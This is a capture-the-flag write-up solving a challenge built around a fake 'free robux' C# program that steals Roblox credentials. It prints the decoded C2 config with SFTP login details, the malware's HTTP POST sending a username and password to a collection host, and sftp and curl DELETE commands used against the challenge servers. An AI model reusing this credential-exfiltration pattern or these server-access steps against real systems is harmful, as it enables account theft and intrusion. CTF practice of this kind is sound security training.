# Write up for scriptkid

## Overview

For this challenge we are trying to find four flags from a malicious C# file purporting to give free robux. 
This challenge involves a C# decompiler and C2 (Command and Control) server.

## Solution

### Flag 1

We can pull out the plaintext strings from "not_malware.dll" using the command:
```
strings -e l .\not_malware.dll
```
From there, you find a token that looks like it's encoded in base64 (due to the "=" at the end). Decoding:
```
ewogICJjMl9zZXJ2ZXIiOiAic2Z0cDovL3NjcmlwdGtpZC5jdGYtbGVhZ2Uub3N1c2VjLm9yZyIsCiAgInBvcnQiOiAxMzA0LAogICJ1c2Vyb
mFtZSI6ICJyZWFsaXR5c3VyZiIsCiAgInBhc3N3b3JkIjogIm9zdXtkMG50X3N0MHIzX3kwdXJfczNjcjN0c19sMWszX3RoMXN9Igp9ICA=
```
we get:
```
{
  "c2_server": "sftp://scriptkid.ctf-league.osusec.org",
  "port": 1304,
  "username": "realitysurf",
  "password": "osu{d0nt_st0r3_y0ur_s3cr3ts_l1k3_th1s}"
}
```
This gets us the first flag and the C2 server.

### Flag 2

Next we can log into the C2 server with sftp using the command:
```
sftp -P 1304 realitysurf@ctf-league.osusec.org
```
and use the password found in the token.
From there we can cd into the ftp folder and use:
```
get flag.txt Downloads
```
to transfer the file to your downloads folder.
The 2nd flag is in that file

### Flag 3

For flag three, we start by running a packet sniffer, like wireshark.
From there, running "robux_generator.exe" (hopefully in a sandboxed VM), and then inputting false roblox credentials we see an http POST is being sent.
```
POST /credentials HTTP/1.1
Host: scriptkidrev.ctf-league.osusec.org
Content-Type: application/json; charset=utf-8
Content-Length: 88

{"Username":"victim_name","Password":"example_password","Secret":"osu{wa1t_1m_g0at3d?}"} 
```
This post contains flag 3

### Flag 4

Going back to the flavor text of the challenge, we want to delete Timmy's credentials from the server. 
Using the destination URL of the the HTTP POST, we have the server containing Timmy's credentials. Thus by running:
```
curl -X "DELETE" http://scriptkidrev.ctf-league.osusec.org/credentials OK
```
we delete Timmy's credentials from the server. The server response contains the final flag.






